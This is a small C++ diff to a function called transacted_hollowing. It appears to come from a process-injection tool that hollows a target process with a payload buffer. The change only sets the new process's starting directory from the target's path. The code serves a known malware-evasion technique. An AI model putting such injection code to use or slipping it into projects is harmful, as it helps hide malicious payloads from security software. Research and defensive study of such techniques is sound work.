@@ -136,9 +136,14 @@ bool transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSiz
         std::cout << "Creating transacted section has failed!\n";
         return false;
     }
+    wchar_t *start_dir = NULL;
+    wchar_t dir_path[MAX_PATH] = { 0 };
+    get_directory(targetPath, dir_path, NULL);
+    if (wcsnlen(dir_path, MAX_PATH) > 0) {
+        start_dir = dir_path;
+    }
     PROCESS_INFORMATION pi = { 0 };
-
-    if (!create_new_process_internal(pi, targetPath, NULL)) {
+    if (!create_new_process_internal(pi, targetPath, start_dir)) {
         std::cerr << "Creating process failed!\n";
         return false;
     }
